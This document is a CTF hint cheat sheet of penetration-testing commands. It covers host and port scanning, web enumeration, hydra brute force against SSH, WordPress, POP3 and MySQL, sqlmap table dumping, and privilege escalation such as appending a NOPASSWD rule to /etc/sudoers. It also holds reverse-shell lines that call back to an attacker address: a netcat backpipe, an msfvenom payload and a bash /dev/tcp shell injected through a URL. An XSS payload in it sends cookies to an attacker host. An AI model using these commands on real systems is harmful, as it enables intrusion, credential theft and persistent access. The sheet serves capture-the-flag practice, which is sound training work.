# CTF Hints

- [CTF Hints](#ctf-hints)
- [Networking](#networking)
		- [Host Discovery](#host-discovery)
- [Port Scanning](#port-scanning)
		- [Nmap](#nmap)
- [WEB Analysis](#web-analysis)
		- [Nikto](#nikto)
		- [Dirb](#dirb)
		- [GoBuster](#gobuster)
- [WordPress](#wordpress)
		- [Analysis](#analysis)
		- [Update Datase Password Hash](#update-datase-password-hash)
- [Hash Analysis](#hash-analysis)
		- [Hash Identifier](#hash-identifier)
		- [HashID](#hashid)
- [Brute Force](#brute-force)
		- [Hash](#hash)
		- [SSH](#ssh)
		- [ZIP](#zip)
		- [WordPress Login](#wordpress-login)
		- [Pop3 - Mail Server](#pop3---mail-server)
		- [MySQL](#mysql)
- [Shell Spawn](#shell-spawn)
		- [Python](#python)
- [FTP](#ftp)
- [SMB](#smb)
- [Pop3 - Mail Server](#pop3---mail-server-1)
- [SSH](#ssh-1)
- [SCP](#scp)
- [SUID](#suid)
- [WEB Server](#web-server)
- [Encoding - Base64](#encoding---base64)
		- [Encoding](#encoding)
		- [Decoding](#decoding)
- [Encoding - Base32](#encoding---base32)
		- [Encoding](#encoding-1)
		- [Decoding](#decoding-1)
- [Script - Binary to ASCII](#script---binary-to-ascii)
- [Hex to ASCII](#hex-to-ascii)
- [Script - ASCII to Char](#script---ascii-to-char)
- [MySQL](#mysql-1)
		- [Connection](#connection)
		- [Actions](#actions)
- [Sudo](#sudo)
		- [List Policy](#list-policy)
		- [Run as User](#run-as-user)
- [Sudoers](#sudoers)
- [Netcat](#netcat)
		- [Listen](#listen)
		- [Reverse Shell Using Backpipe](#reverse-shell-using-backpipe)
- [Payloads](#payloads)
		- [Linux Reverse Python Raw](#linux-reverse-python-raw)
- [Linux Password](#linux-password)
		- [Password Hash](#password-hash)
- [Custom Wordlists](#custom-wordlists)
		- [Cewl](#cewl)
- [SQL Injection](#sql-injection)
		- [Analysis](#analysis-1)
		- [Navigation](#navigation)
- [Steganography](#steganography)
		- [Exiftool](#exiftool)
		- [Steghide](#steghide)
	- [NFS](#nfs)
		- [List Mount Points](#list-mount-points)
		- [Mount](#mount)
		- [Umount](#umount)
- [GPG](#gpg)
		- [Decrypt](#decrypt)
- [OpenSSL](#openssl)
		- [Decrypt RSA](#decrypt-rsa)
- [RDP](#rdp)
- [AWS S3](#aws-s3)
		- [List Bucket Files](#list-bucket-files)
		- [Download File](#download-file)
- [Script - Extract All File in Directory](#script---extract-all-file-in-directory)
- [Script - Directory Files Iteration](#script---directory-files-iteration)
- [XSS](#xss)
		- [Validation](#validation)
		- [Acquiring Cookies](#acquiring-cookies)
- [HTTP](#http)
		- [URL Scapping](#url-scapping)
		- [Reverse Shell Example](#reverse-shell-example)
- [Crontab](#crontab)
		- [List Jobs](#list-jobs)
		- [Edit](#edit)


<a name="Networking"></a>
# Networking

<a name="HostDiscovery"></a>
### Host Discovery

```
netdiscover -r {NETWORK}/{MASK}
```

```
nmap -sV {NETWORK}/{MASK}
```

<a name="PortScanning"></a>
# Port Scanning

<a name="Nmap"></a>
### Nmap

```
# Simple Scan
nmap {TARGET}

# Port Range Scan
nmap -p {MIN}-{MAX} {TARGET}

# All Ports Scan
nmap -p- {TARGET}

# Complete Scan
nmap -AT4 -p- {TARGET}

# Script Scan
nmap --script=vuln {TARGET}
```

<a name="WebAnalysis"></a>
# WEB Analysis

<a name="Nikto"></a>
### Nikto

```
nikto -h {TARGET}
```

<a name="Dirb"></a>
### Dirb

```
dirb {TARGET}
```

<a name="GoBuster"></a>
### GoBuster

```
gobuster dir -t 50 -u {TARGET} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt,.js,/,.html

gobuster dir -t 50 -u {TARGET} -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -x .php,.txt,.js,/,.html --wildcard
```

<a name="WordPress"></a>
# WordPress

<a name="Analysis"></a>
### Analysis

```
# Simple Scan
wpscan --url {TARGET}

# Complete Scan
wpscan -e ap,at --url {TARGET}

# Looking for vulnerabilities
wpscan -e vp,vt --url {TARGET}

# User Enummeration
wpscan -e u --url {TARGET}
```

<a name="UpdateDatasePasswordHash"></a> 
### Update Datase Password Hash

```
echo -n "password" | md5sum
5f4dcc3b5aa765d61d8327deb882cf99

mysql> UPDATE {TABLE} SET {FIELD}='5f4dcc3b5aa765d61d8327deb882cf99' WHERE ID={ID};
```

<a name="Hash"></a>
# Hash Analysis

<a name="HashIdentifier"></a>
### Hash Identifier

```
hash-identifier {HASH}
```

<a name="HashID"></a>
### HashID

```
hashid -mj {HASH}
```

<a name="BruteForce"></a>
# Brute Force

<a name="Hash"></a>
### Hash

```
hashcat -m {MODE} {HASH_FILE} /usr/share/wordlists/rockyou.txt
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt {HASH_FILE} 
john --show {HASH_FILE}
```

<a name="SSH"></a>
### SSH

```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET}
```

<a name="ZIP"></a>
### ZIP

```
zip2john {ZIP_FILE} > {ZIP_FILE}.hash
john --wordlist='{WORDLIST_PATH}' {ZIP_FILE}.hash
john --show {ZIP_FILE}.hash
```

```
fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' {ZIP_FILE}
```

<a name="WordPressLogin"></a>
### WordPress Login

```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt -vV -f -t 4 {TARGET} http-post-form "/weblog/wp-login.php:log=^USER^&pwd=^PASS^:login_error"
```

```
wpscan --url {TARGET} -U {USERS_LIST} -P /usr/share/wordlists/rockyou.txt
```

<a name="Pop3"></a>
### Pop3 - Mail Server

```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f pop3
```

<a name="MySQL"></a>
### MySQL

```
hydra -l {USER} -P /usr/share/wordlists/rockyou.txt {TARGET} -f -t 32 mysql
```

<a name="ShellSpawn"></a>
# Shell Spawn

<a name="Python"></a>
### Python

```
python -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

<a name="FTP"></a>
# FTP

```
# Access
ftp {TARGET}

# Download file to current directory
ftp> ls
ftp> get {FILE}

# Download multiples file to current directory
ftp> mget {DIRECTORY}

# pwd
ftp> pwd
```

<a name="SMB"></a>
# SMB

```
# Disks list
smbmap -H {TARGET}

# Connection
smbclient //{TARGET}/{DISK}

# Download file to current directory
smb: \> dir
smb: \> get {FILE}
```

<a name="pop3"></a>
# Pop3 - Mail Server

```
# Connection
nc {TARGET} pop3

# Actions
> LIST
> RETR {ID}
```

<a name="SSH"></a>
# SSH

```
# Password Auth
ssh {USER}@{IP}

# Key Auth in specific port
ssh {USER}@{IP} -i {KEY} -p {PORT}
```

<a name="SCP"></a>
# SCP

```
# Local to remote
scp {LOCAL_PATH} {USER}@{IP}:{REMOTE_PATH}

# Remote to Local
scp {USER}@{IP}:{REMOTE_PATH} {LOCAL_PATH}

# Key Auth in Specific Port
scp -i {KEY} -p {PORT} {USER}@{IP}:{REMOTE_PATH} {LOCAL_PATH}
```

<a name="SUID"></a>
# SUID

```
find / -type f -perm -u=s 2>/dev/null
```

<a name="WebServer"></a>
# WEB Server

```
# Server up in current directory
python -m SimpleHTTPServer 8080
python -m http.server 8080

# GET
wget http://{TARGET}:{PORT}/{URI}
curl http://{TARGET}:{PORT}/{URI}
```

<a name="Base64"></a>
# Encoding - Base64

<a name="Encoding64"></a>
### Encoding

```
base64 {FILE}
base64 "{DATA}"
cat {FILE} | base64
echo "{DATA}" | base64
```

<a name="Decoding64"></a>
### Decoding

```
base64 -d {FILE}
base64 -d "{DATA}"
cat {FILE} | base64 -d
echo "{DATA}" | base64 -d
```

<a name="Base32"></a>
# Encoding - Base32

<a name="Encoding32"></a>
### Encoding

```
base32 {FILE}
base32 "{DATA}"
cat {FILE} | base32
echo "{DATA}" | base32
```

<a name="Decoding32"></a>
### Decoding

```
base32 -d {FILE}
base32 -d "{DATA}"
cat {FILE} | base32 -d
echo "{DATA}" | base32 -d
```

<a name="Bin2Ascii"></a>
# Script - Binary to ASCII

```
$ cat bin.txt
01100111 01101111 01101111 01100100 00100000 01110111 01101111 01110010

$ cat bin2ascii.sh

#!/bin/bash
ARRAY=$(cat $1)
for bin in $ARRAY
do
	dec=$((2#${bin}))
	echo -ne \\x$(printf %02x $dec)
done
```

<a name="Hex2Ascii"></a>
# Hex to ASCII

```
echo {HEX_TEXT} | xxd -r -p
```

<a name="Ascii2Char"></a>
# Script - ASCII to Char

```
$ cat ascii2char.c

#include <stdlib.h>
#include <stdio.h>

void main(void) {
	int ascii[] = {117, 115, 101, 32, 114, 111, 99, 107, 121, 111, 117, 46, 116, 120, 116};
	for (int i=0; i<sizeof(ascii)/sizeof(int); i++) printf("%c", ascii[i]);
	printf("\n");
}

gcc ascii2char.c -o ascii2char.o && ./ascii2char.o
```

<a name="MySQL"></a>
# MySQL

<a name="Connection"></a>
### Connection

```
mysql -u {USER} -h {TARGET} -p {PASSWORD}
```

<a name="Actions"></a>
### Actions

```
mysql> show databases;
mysql> user {DATABASE};
mysql> show tables;
mysql> SELECT {FIELD_1},{FIELD_2} FROM {TABLE};
```

<a name="Sudo"></a>
# Sudo

<a name="List Policy"></a>
### List Policy

```
sudo -l
```

<a name="RunAsUser"></a>
### Run as User

```
sudo -u {USER} {COMMAND}
```

<a name="Sudoers"></a>
# Sudoers

```
# {USER} ALL=(ALL) NOPASSWD: ALL
echo "{USER} ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
```

<a name="Netcat"></a>
# Netcat

<a name="Listen"></a>
### Listen

```
nc -lcnp {PORT}
```

<a name="ReverseShellUsingBackpipe"></a>
### Reverse Shell Using Backpipe

```
mknod /tmp/backpipe p
/bin/sh 0</tmp/backpipe | nc 192.168.1.116 4444 1>/tmp/backpipe
```

<a name="Payloads"></a>
# Payloads

<a name="LinuxReversePythonRaw"></a>
### Linux Reverse Python Raw

```
msfvenom -p cmd/unix/reverse_python LHOST={HOST_IP} LPORT={HOST_PORT} -f raw
```

<a name="LinuxPass"></a>
# Linux Password

<a name="PasswordHash"></a>
### Password Hash

```
openssl passwd -1 -salt root root
$1$root$9gr5KxwuEdiI80GtIzd.U0
```

<a name="CustomWordlists"></a>
# Custom Wordlists

<a name="Cewl"></a>
### Cewl

```
cewl http://192.168.1.101/index.html > wordlist.txt
cewl {FILE} > wordlist.txt
cewl {URL} > wordlist.txt
```

<a name="SQLi"></a>
# SQL Injection

<a name="Analysis"></a>
### Analysis

```
# login.req is a text file with a login POST intercepted by Burp
sqlmap -r login.req -p {POST_PARAMETER} --batch
```

<a name="Navigation"></a>
### Navigation

```
sqlmap -r login.req -p u --batch --current-db
sqlmap -r login.req -p u --batch -D {DB} --tables
sqlmap -r login.req -p u --batch -D {DB} -T {TABLE} --columns
sqlmap -r login.req -p u --batch -D {DB} -T {TABLE} -C {FIELD_1},{FIELD_2},{FIELD_3} --dump
```

<a name="Steganography"></a>
# Steganography

<a name="Exiftool"></a>
### Exiftool

```
exiftool {FILE}
```

<a name="Steghide"></a>
### Steghide

```
steghide extract -sF {FILE}
```

<a name="NFS"></a>
## NFS

<a name="ListMountPoints"></a>
### List Mount Points

```
showmount -e {TARGET}
```

<a name="Mount"></a>
### Mount

```
mount {TARGET}:{MOUNT_POINT} {LOCAL_PATH}
```

<a name="Umount"></a>
### Umount

```
umount {LOCAL_PATH}
```

<a name="GPG"></a>
# GPG

<a name="DecryptGPG"></a>
### Decrypt

```
gpg -d {GPG_FILE}
```

<a name="OpenSSL"></a>
# OpenSSL

<a name="DecryptRSA"></a>
### Decrypt RSA

```
openssl rsautl -decrypt -inkey {PRIV_KEY} -in {ENCRYPTED_FILE} -out {DECRYPTED_FILE}
```

<a name="RDP"></a>
# RDP

```
xfreerdp /u:{USER} /p:{PASS} /v:{TARGET}
```

<a name="AwsS3"></a>
# AWS S3

<a name="List BucketFiles"></a>
### List Bucket Files

```
curl {BUCKET_NAME}.s3.amazonaws.com | xmllint --format -
```

<a name="DownloadFile"></a>
### Download File

```
curl {BUCKET_NAME}.s3.amazonaws.com/{FILE}
```

<a name="ExtractAllFiles"></a>
# Script - Extract All File in Directory

```
import os
import zipfile

filesList = os.listdir("./extract")

for file in filesList:
    filePath = './extract/' + str(file)
    with zipfile.ZipFile(filePath, 'r') as zipRef:
        zipRef.extractall('./extract_txt')
```

<a name="DirectoryFilesIteration"></a>
# Script - Directory Files Iteration

```
#!/bin/bash

for file in ./extract_txt/*.txt ; do
	echo ${file}
done
```

<a name="XSS"></a>
# XSS

<a name="Validation"></a>
### Validation

```
<script>alert('XSS Works')</script>
</p><script>console.log("XSS Works")</script><p>
```

<a name="AcquiringCookies"></a>
### Acquiring Cookies

```
nc -lvnp 80
</p><script>window.location = 'http://{LOCAL_IP}/page?param=' + document.cookie </script><p>
```

<a name="HTTP"></a>
# HTTP

<a name="URLScapping"></a>
### URL Scapping

```
# %20 = Space
# %2f = /
curl http://example.com/api/cmd/ls%20%2fhome
```

<a name="URLReverseShellExample"></a>
### Reverse Shell Example

```
# Listen
nc -lvnp {LOCAL_PORT}

# Request with: bash -i >& /dev/tcp/{LOCAL_IP}/{LOCAL_PORT} 0>&1
http://example.com/api/cmd/bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F{LOCAL_IP}%2F{LOCAL_PORT}%200%3E%261
```

<a name="Crontab"></a>
# Crontab

<a name="ListJobs"></a>
### List Jobs

```
crontab -l
cat /etc/crontab
```

<a name="EditJobs"></a>
### Edit

```
crontab -e

# * * * * * <command to be executed>
# - - - - -
# | | | | |
# | | | | ----- Weekday (0 - 7) (Sunday is 0 or 7, Monday is 1...)
# | | | ------- Month (1 - 12)
# | | --------- Day (1 - 31)
# | ----------- Hour (0 - 23)
# ------------- Minute (0 - 59)
```
